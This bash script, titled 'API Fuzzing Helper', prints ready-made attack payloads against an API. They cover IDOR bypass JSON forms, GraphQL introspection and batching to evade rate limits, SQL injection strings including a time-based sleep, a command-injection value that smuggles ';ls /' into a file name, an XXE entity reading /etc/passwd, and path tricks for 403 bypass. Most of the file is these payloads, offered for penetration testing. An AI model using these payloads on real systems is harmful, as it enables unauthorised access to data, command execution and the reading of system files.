#!/bin/bash
# API Fuzzing Helper
# Generates commands and payloads for API security testing

show_help() {
    echo "Usage: $0 [test_type] [options]"
    echo ""
    echo "Test Types:"
    echo "  recon       - API reconnaissance commands"
    echo "  idor        - Generate IDOR bypass payloads"
    echo "  graphql     - GraphQL specific payloads"
    echo "  bypass      - 403/401 bypass techniques"
    echo "  injection   - JSON/API injection payloads"
    echo ""
    echo "Options:"
    echo "  -u URL      - Target URL"
    echo "  -i ID       - Target ID for IDOR tests"
}

URL="https://target.com/api"
ID="123"

ATTACK=$1
shift

while getopts "u:i:" opt; do
  case $opt in
    u) URL="$OPTARG" ;;
    i) ID="$OPTARG" ;;
    \?) echo "Invalid option -$OPTARG" >&2; ;;
  esac
done

case "$ATTACK" in
    recon)
        echo "=== API Reconnaissance ==="
        echo "Common Swagger/OpenAPI endpoints:"
        echo "  $URL/swagger.json"
        echo "  $URL/openapi.json"
        echo "  $URL/api-docs"
        echo "  $URL/v1/api-docs"
        echo "  $URL/swagger-ui.html"
        echo ""
        echo "Kiterunner command:"
        echo "  kr scan $URL -w routes-large.kite"
        ;;
    idor)
        echo "=== IDOR Bypass Payloads for ID: $ID ==="
        echo "Array Wrap: {\"id\":[$ID]}"
        echo "JSON Wrap:  {\"id\":{\"id\":$ID}}"
        echo "Pollution:  ?id=<LEGIT>&id=$ID"
        echo "Wildcard:   {\"id\":\"*\"}"
        echo "Numeric:    Try numeric ID instead of string/email if applicable"
        ;;
    graphql)
        echo "=== GraphQL Payloads ==="
        echo "Introspection Query (URL-encoded):"
        echo "  $URL/graphql?query={__schema{types{name,kind,description,fields{name}}}}"
        echo ""
        echo "Batching (Rate Limit Bypass):"
        echo "  [{\"query\":\"mutation{...}\"}, {\"query\":\"mutation{...}\"}]"
        echo ""
        echo "SQLi in Mutation:"
        echo "  email: \"test' or 1=1--\""
        ;;
    bypass)
        echo "=== Endpoint Bypass Techniques ==="
        echo "For endpoint: $URL/sensitive"
        echo "Try:"
        echo "  $URL/sensitive.json"
        echo "  $URL/sensitive?"
        echo "  $URL/sensitive/"
        echo "  $URL/sensitive??"
        echo "  $URL/sensitive%20"
        echo "  $URL/sensitive%09"
        echo "  $URL/sensitive#"
        echo "  $URL/..;/sensitive"
        ;;
    injection)
        echo "=== API Injection Payloads ==="
        echo "SQLi in JSON:"
        echo "  {\"id\":\"$ID AND 1=1#\"}"
        echo "  {\"id\":\"$ID AND sleep(15)#\"}"
        echo ""
        echo "Command Injection:"
        echo "  $URL/endpoint?name=file.txt;ls%20/"
        echo ""
        echo "XXE:"
        echo "  <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>"
        ;;
    *)
        show_help
        ;;
esac
